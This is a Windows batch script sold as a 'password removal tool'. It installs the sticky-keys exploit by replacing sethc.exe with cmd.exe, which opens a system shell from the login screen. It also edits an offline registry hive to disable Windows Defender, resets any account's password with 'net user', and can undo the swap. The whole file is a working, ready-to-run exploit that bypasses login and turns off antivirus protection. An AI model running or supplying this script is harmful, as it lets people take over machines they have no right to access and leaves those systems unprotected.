@ECHO off
echo Password removal tool
echo What would you like to do?
echo 1: Install exploit
echo 2: Remove password
echo 3: Uninstall exploit
set /p var=Enter the number
if %var%==1 goto install
if %var%==2 goto remove
if %var%==3 goto uninstall

:install

echo Creating exploit
dir C:
copy c:\windows\system32\sethc.exe c:\
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

echo Disabling antivirus alert

reg load HKLM\temp-hive c:\windows\system32\config\SOFTWARE
reg add "HKLM\temp-hive\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg unload HKLM\temp-hive
echo Complete
pause
exit

:remove
set /p user_name=Enter the username
net user %user_name% *
echo password removed
pause
exit

:uninstall
copy /y c:\sethc.exe c:\windows\system32\sethc.exe
echo Removed sticky keys exploit
echo Please re-enable Windows Defender
pause
exit